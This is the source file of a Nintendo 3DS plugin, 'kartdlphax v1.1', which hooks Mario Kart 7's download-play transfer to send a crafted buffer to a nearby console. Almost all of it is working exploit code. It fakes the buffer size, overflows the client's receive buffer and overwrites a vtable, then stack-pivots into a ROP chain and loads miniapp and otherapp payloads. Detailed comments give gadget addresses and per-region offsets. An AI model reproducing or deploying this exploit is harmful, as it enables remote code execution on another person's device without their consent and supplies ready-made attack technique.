#include <3ds.h>
#include "csvc.h"
#include <CTRPluginFramework.hpp>
#include "PatternManager.hpp"
#include "OSDManager.hpp"
#include "rt.h"
#include "ropbin_eur.h"
#include "miniapp_eur.h"
#include "ropbin_usa.h"
#include "miniapp_usa.h"
#include "ropbin_jap.h"
#include "miniapp_jap.h"
#include "otherapp.h"

#include <vector>
#include <string.h>

extern "C" {
    u32 sendBufferCallback(u32 dst, u32 src, u32 size);
	u32 g_sendBufferret;
}

static void NAKED sendBufferfunc() {
    __asm__ __volatile__
    (
        "MOV             R2, R4 \n" // The hook replaces two instructions, so we place them here.
        "ADD             R1, R1, R3 \n"
        "PUSH			 {R0, R2-R3, LR} \n" // Back up registers.
        "BL				 sendBufferCallback \n" // Jump to the send callback function.
        "MOV		     R1, R0 \n" // Replace the src with the return value.
        "POP		     {R0, R2-R3, LR} \n" // Load registers back.
        "LDR		     R12, =g_sendBufferret \n" // Return to the hook point.
        "LDR		     PC, [R12] \n"
    );
}

namespace CTRPluginFramework
{
    LightEvent exitEvent;
    RT_HOOK sendDataHook;
    int usedotherapp;

    static inline u32   decodeARMBranch(const u32 *src)
	{
		s32 off = (*src & 0xFFFFFF) << 2;
		off = (off << 6) >> 6;
		return (u32)src + 8 + off;
	}
    static inline int roundUp(int numToRound, int multiple) 
    {
        return ((numToRound + multiple - 1) / multiple) * multiple;
    }

    // This function executes before the game runs.
    void    PatchProcess(FwkSettings &settings)
    {
        const u8 getBufferSizePat[] = {0x09, 0x40, 0x20, 0x10, 0x29, 0x00, 0x56, 0xE3, 0xB1, 0x00, 0x00, 0x0A, 0x29, 0x00, 0xA0, 0xE3};
        const u8 sendBufferDataPat[] = {0x08, 0x00, 0x87, 0xE2, 0x94, 0x06, 0x03, 0xE0, 0x03, 0x10, 0x41, 0xE0, 0x04, 0x00, 0x51, 0xE1};

        PatternManager pm;

        // Search the function that sets the send buffer size.
        pm.Add(getBufferSizePat, 0x10, [](u32 addr) {
			u32 func = decodeARMBranch((u32*)(addr + 0x248)) + 0x10;
			*((u32*)func) = 0xE3A03207; // Tell the game the output buffer is giant (0x70000000)
			return true;
		});

        // Search the function that sends the buffer data.
        pm.Add(sendBufferDataPat, 0x10, [](u32 addr) {
			rtInitHook(&sendDataHook, addr + 0x18, (u32)sendBufferfunc);
			rtEnableHook(&sendDataHook);
			g_sendBufferret = addr + 0x18 + 0x8; // + 0x8 because the hook replaces 2 instructions.
			return true;
		});

        pm.Perform();
    }

    static constexpr u32 TRANSFERBLOCKSIZE = 0x37C;                             // The size in bytes of a single transfer block.

	u32 pwnBuffer[TRANSFERBLOCKSIZE / 4] = { 0 };                               // Buffer sent with the vtable pwn
    int gameRegion = -1;                                                        // Region of the game. EUR -> 0, USA -> 1, JAP -> 2

    #define EXPLOIT_VARIANT 1                                                   // Exploit variant to use, both achieve the same thing
    static constexpr u32 VTABLEPWNBLOCK = 0x1740;                               // Block in the buffer that cointains the vtable pwn
    static constexpr u32 ORIGSTACK1 = 0x0FFFFDC0;                               // Original stack addr when the vtable pwn first exploit variant triggers 
    static constexpr u32 ORIGSTACK2 = 0x0FFFFDC8;                               // Original stack addr when the vtable pwn second exploit variant triggers 
    static constexpr u32 LDR_R3_FROM_R0 = 0x0012E54C;                               // Jumping here loads [R0, #0x8] into R3
    static constexpr u32 BXLR = LDR_R3_FROM_R0 + 0x58;                              // Jumping here does BX LR, returning immediately
    static constexpr u32 STACKPIVOT = 0x00113688;                               // Jumping here can control SP + PC from value in R3
    static constexpr u32 PLUGINBUFFERSIZE = TRANSFERBLOCKSIZE * 0xA82;          // Size of the fake sent buffer ~2.4MB
    static constexpr u32 STARTBUFFER[] = {                                      // Start of the recv buffer in the client application
        0x1424FDB4,
        0x1424F774,
        0x1424F524
    }; //                             
    static constexpr u32 ROPBUF[] = {                                           // Start of the ROP in the client application
        STARTBUFFER[0] + 8,
        STARTBUFFER[1] + 8,
        STARTBUFFER[2] + 8
    };                              
    static constexpr u32 MINIAPPBUF[] = {                                       // Start of the miniapp in the client application, page aligned
        0x14253000, 
        0x14254000,
        0x14254000
    };                              
    static constexpr u32 OTHERAPPBUF[] = {                                      // Start of the otherapp in the client application
        STARTBUFFER[0] + TRANSFERBLOCKSIZE * 16, 
        STARTBUFFER[1] + TRANSFERBLOCKSIZE * 22, 
        STARTBUFFER[2] + TRANSFERBLOCKSIZE * 24
    };

    const unsigned char* ropbin_addr[] = {payload_eur_bin, payload_usa_bin, payload_jap_bin};
    const long int ropbin_size[] = {payload_eur_bin_size, payload_usa_bin_size, payload_jap_bin_size};

    const unsigned char* miniapp_addr[] = {miniapp_eur_bin, miniapp_usa_bin, miniapp_jap_bin};
    const long int miniapp_size[] = {miniapp_eur_bin_size, miniapp_usa_bin_size, miniapp_jap_bin_size};

    static u8* exploitBuffer = nullptr; // Fake buffer to be sent

    // The exploit magic happens here. This function is mitm just before
    // the game memcopies src to dst. The return value changes the src address.
    // Size is always 0x37C.
	u32 sendBufferCallback(u32 dst, u32 src, u32 size) {
		static u32 currblock = 0;
        static u32 buffstart = src;
		if (currblock == VTABLEPWNBLOCK) { 
            // This block causes the vtable pwn that triggers the actual exploit. During development I fist found the exploit variant 1,
            // but due to a missunderstanding on how ARM conditional flags work, I thought it was not viable. After that, I found exploit variant 2,
            // which is the one I went forward with. Now that I properly understand ARM conditional flags, both variants can be used for the exploit
            // and produce the exact same results.
            //
            // In order to start our ROP, we need to somehow change the value of the stack pointer (SP), this can be done using the instructions at STACKPIVOT:
            //
            // ADD             SP, SP, R3
            // LDR             PC, [SP],#4
            //
            // As you can see, the first instruction sets the stack pointer from the addition of the current SP value and R3. After that, it pops the value
            // from SP into PC. If we want to start our ROP, we need to have the proper value in R3, as well as cause a jump to this address (the initial value of SP
            // is not important, as when the exploit triggers it's always the same and can be adjusted by changing R3).
            //
            // NOTE: The following documentation uses C pointer arithmetic notation for accessing pwnBuffer. If you want to obtain the actual byte offset into the buffer
            // (so that it matches ARM assembly notation), you need to multiply the offset value by 4.
            // For example, pwnBuffer + 0x35 is actually byte offset (u8*)pwnBuffer + (0x35 * 4) = (u8*)pwnBuffer + 0xD4.
            //
#if EXPLOIT_VARIANT == 1
            // This is the first variant of the exploit, it triggers by overwritting a vtable in the function that updates the button state, which runs every frame.
            // In the European version of the game, this happens at address 0x004143D0:
            //
            // LDR             R1, [R0]
            // LDR             R1, [R1,#0xC]
            // BLX             R1
            //
            // Normally, the value R0 is meant to be a pointer to an object with a vtable. However, this overlaps with the address pwnBuffer + 0x35.
            // When the first instruction executes, and the buffer overflow has happened, it causes it to load the contents of pwnBuffer + 0x35 into R1.
            // After that, the second instruction uses that value + 0xC to obtain a function pointer to jump to. We can use this to cause an arbitrary jump.
            // First, we set up pwnBuffer[0x35] to point to pwnBuffer + 0x37:
            pwnBuffer[0x35] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x37 * 4;
            // When the game then adds 0xC to that value, it obtains the address pwnBuffer + 0x3A, which we can set to the address we want to jump to:
			pwnBuffer[0x3A] = LDR_R3_FROM_R0;
            // So why aren't we jumping into STACKPIVOT directly? As stated before, we need to set R3 to the proper value, but at this point R3 doesn't  
            // have the proper value. Instead, we have to jump to somewhere else that can set R3 from R0 and then cause another jump to STACKPIVOT
            // Luckily, the function at LDR_R3_FROM_R0 can do just that (some unimportant parts of the function have been removed):
            //
            // LDR             R3, [R0,#8]
            // ...
            // LDR             R2, [R0,#0xC]
            // ...
            // LDR             R0, [R0,#0x10]
            // TST             R0, #1
            // ...
            // BEQ             branch_R2
            // ...
            // branch_R2:
            //      BX              R2
            //
			// At this point, R0 still holds the address pwnBuffer + 0x35, so we can modify the values after
            // that address to be able to set R3 and jump to STACKPIVOT.
            // Fist, we set up pwnBuffer + 0x37, which corresponds to [R0, #8] and contains the value that will be placed into R3:
			pwnBuffer[0x37] = ROPBUF[gameRegion] - ORIGSTACK1;
            // When ADD SP, SP, R3 executes later, this will set the value of SP to the start of the ROP.
            // We now have to set up the value of pwnBuffer + 0x38, which corresponds to [R0, #0xC] and contains the value that will be placed into R2, and will
            // be jumped to later:
			pwnBuffer[0x38] = STACKPIVOT;
            // Finally, we need to make sure the branch is performed properly, so we need to set the value at pwnBuffer + 0x39, which corresponds to [R0, #0x10] to
            // be 0, so the TST, #1 instruction makes the game branch to BX R2:
            pwnBuffer[0x39] = 0;
            // At this point, the game will jump to R2, which contains the address of the stack pivot with the proper R3 value set, and eventually, execute ROP.
#elif EXPLOIT_VARIANT == 2
            // This is the second variation of the exploit, it triggers by overwritting another vtable in another function that updates the buttons state.
            // The second variant triggers at a later point after the first variant has already triggered, so in order to use this variant,
            // we first need to prevent the first variant from crashing. For that, we can just set the function to jump to to immediately return (BX LR).
            // Check the documentation of the previous variant to understand why these values are used.
            pwnBuffer[0x35] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x37 * 4;
			pwnBuffer[0x3A] = BXLR;
            // After the first variant has been disabled, we can continue.
            // In the European version of the game, this happens at address 0x003EA1F4:
            //
            // LDR             R1, [R0]
            // LDR             R1, [R1,#0x18]
            // BX              R1
            //
            // As you can see, this has the same structure as the function in the previous variant, but luckily for us, when it executes, the value at R3 comes
            // from pwnBuffer + 0x11, so we don't need to jump into an intermediary function to set R3 to the proper value.
            // Sadly, I can't document where R3 is set, as it comes from a previous function execution and without a debugger, it's very difficult to guess.
            // First, we set the value at pwnBuffer + 0x11 so that it gets loaded into R3:
			pwnBuffer[0x11] = ROPBUF[gameRegion] - ORIGSTACK2 - 2;
            // The "- 2" part is because the value loaded into R3 is actually pwnBuffer[0x11] + 2, so we substract 2 to cancel it out.
            // Normally, the value R0 is meant to be a pointer to an object with a vtable. However, this overlaps with the address pwnBuffer + 0x43.
            // When the first instruction executes, and the buffer overflow has happened, it causes it to load the contents of pwnBuffer + 0x43 into R1.
            // After that, the second instruction uses that value + 0x18 to obtain a function pointer to jump to. We can use this to cause an arbitrary jump.
            // First, we set up pwnBuffer[0x43] to point to itself:
			pwnBuffer[0x43] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x43 * 4;
			// When the game then adds 0x18 to that value, it obtains the address pwnBuffer + 0x49, which we can set to the address we want to jump to:
			pwnBuffer[0x49] = STACKPIVOT;
            // At this point, the game will jump to the stack pivot with the proper value at R3 set, and eventually, execute ROP.
#endif
			currblock++;
			return (u32)pwnBuffer;
		}

        // Display screen message.
        if (currblock < VTABLEPWNBLOCK)
            OSDManager["t"].SetScreen(false).SetPos(15,21) = Utils::Format("Sending hax: %.1f%%", ((float)currblock / VTABLEPWNBLOCK) * 100.f);
        else
            OSDManager["t"].SetScreen(false).SetPos(15,21) = "Done!";
        
        currblock++;

        // Wait a few block transfers after the pwn to exit.
        if (currblock >= VTABLEPWNBLOCK + 0xF) { Sleep(Seconds(1.f)); Process::ReturnToHomeMenu(); }

        // Replace src with our exploit buffer.
        if (currblock * TRANSFERBLOCKSIZE < PLUGINBUFFERSIZE)
		    return (u32)exploitBuffer + (src - buffstart);
        else
            return src;
	}

    // This function constructs the buffer that will be sent.
    // The buffer has the following structure:
    //               Offset               Size       Value
    //                  0x0                0x4       size of the otherapp payload (block aligned)
    //                  0x4                0x4       amount of times the otherapp payload is repeated
    //                  0x8            ROPsize       ROP chain
    //      next page align        miniappsize       MINIAPP payload
    //             block 16  off 0x0 * off 0x4       OTHERAPP payload repeated until buffer is filled
    //
    // Why is the otherapp payload repeated? First we have to talk about paral... ehem, the transfer protocol:
    // It looks like the game does some sort of UDP for sending the data. The host transfers the entire buffer in one go,
    // even tho some of the blocks may be lost in the process. The client keeps track of which blocks were recieved, so after
    // the first transfer is over, it asks the host for the missing blocks until it has all of them. The problem is the buffer 
    // overflow and the vtable pwn executing ROP happens before the first transfer even finishes. This causes the recieve buffer 
    // to have "gaps" of zeroed data where the blocks were lost. This is the main reason the exploit fails sometimes before miniapp
    // takes control (when the screen starts flashing), as the vtable pwn + rop + miniapp blocks all need to be intact.
    // Otherapp though is pretty big and occupies several blocks, and the chances of any of them being lost is pretty high.
    // The solution is to send many copies of otherapp, and let the miniapp payload reconstruct it from all the copies (normally
    // about 70 copies are sent). That's the reason we send the otherapp size and the repeat times at the start of the buffer.
    // The reconstruct process checks if the current otherapp block first u32 is 0, if it is, it checks the next copy, and so on. 
    // That's why we set the first value of a block to a magic value if it is 0, so miniapp can differentiate it from a missing block.
    void    constructExploitBuffer() {
        u32 otherappsize;

        // Allocate exploit buffer.
        exploitBuffer = (u8*)calloc(PLUGINBUFFERSIZE, 1);
        if (!exploitBuffer) svcBreak(USERBREAK_USER);

        // Copy the rop chain and the miniapp to to the exploit buffer.
        memcpy((exploitBuffer + ROPBUF[gameRegion] - STARTBUFFER[gameRegion]), ropbin_addr[gameRegion], ropbin_size[gameRegion]);
        memcpy((exploitBuffer + MINIAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), miniapp_addr[gameRegion], miniapp_size[gameRegion]);

        // Try opening the otherapp file from SD.
        {
            File otherappFile("/kartdlphax_otherapp.bin", File::READ);
            if (otherappFile.IsOpen())
            {
                // Read the otherapp file into the first copy in the buffer.
                usedotherapp = 0;
                otherappsize = otherappFile.GetSize();
                otherappFile.Read((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), otherappsize);
            } else {
                // Copy the built-in otherapp into the first copy in the buffer.
                usedotherapp = 1;
                otherappsize = otherapp_bin_size;
                memcpy((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), otherapp_bin, otherappsize);
            }
        }

        // Round the otherapp size to next block size and calculate the repeat times.
        otherappsize = roundUp(otherappsize, TRANSFERBLOCKSIZE);
        u32 repeatTimes = (PLUGINBUFFERSIZE - (OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion])) / otherappsize;

        // Set the first u32 in each block in the otherapp to a magic value in case it is 0, so miniapp can differentiate it with a missing block.
        for (int i = 0; i < otherappsize / TRANSFERBLOCKSIZE; i++) {
            u32* block = (u32*)((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]) + TRANSFERBLOCKSIZE * i);
            if (block[0] == 0)
                block[0] = 0x05500000;
        }

        // Repeat the first copy of otherapp until it fills the entire exploit buffer.
        for (int i = 1; i < repeatTimes; i++) {
            memcpy((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]) + otherappsize * i, (exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), otherappsize);
        };

        // Set the otherapp size and repeated times.
        ((u32*)exploitBuffer)[0] = otherappsize;
        ((u32*)exploitBuffer)[1] = repeatTimes;
    }

    // This function is called when the process exits
    void    OnProcessExit(void)
    {
        LightEvent_Signal(&exitEvent);
    }

    // This function is called after the game starts executing and CTRPF is ready.
    int     main(void)
    {
        LightEvent_Init(&exitEvent, RESET_ONESHOT);

        u32 tidLow = (u32)Process::GetTitleID();
        switch (tidLow)
        {
        case 0x00030700:
            gameRegion = 0;
            break;
        case 0x00030800:
            gameRegion = 1;
            break;
        case 0x00030600:
            gameRegion = 2;
            break;
        default:
            break;
        }

        OSD::Notify("Welcome!");
        OSD::Notify("kartdlphax v1.1");
        if (gameRegion != -1) {
            const char* regTexts[] {"Europe", "America", "Japan"};
            OSD::Notify(std::string("Region: ") + regTexts[gameRegion]);
        } else {
            OSD::Notify("Unsupported region :(");
            Sleep(Seconds(5.f));
            Process::ReturnToHomeMenu();
        }

        constructExploitBuffer();
        
        OSD::Notify((usedotherapp == 0) ? "Using otherapp file from SD." : "Using built-in universal otherapp.");

        // Wait for process exit event.
        LightEvent_Wait(&exitEvent);

        free(exploitBuffer);

        // Exit plugin
        return (0);
    }
}

// Thunk from C to C++.
u32 sendBufferCallback(u32 dst, u32 src, u32 size) {
	return CTRPluginFramework::sendBufferCallback(dst, src, size);
}
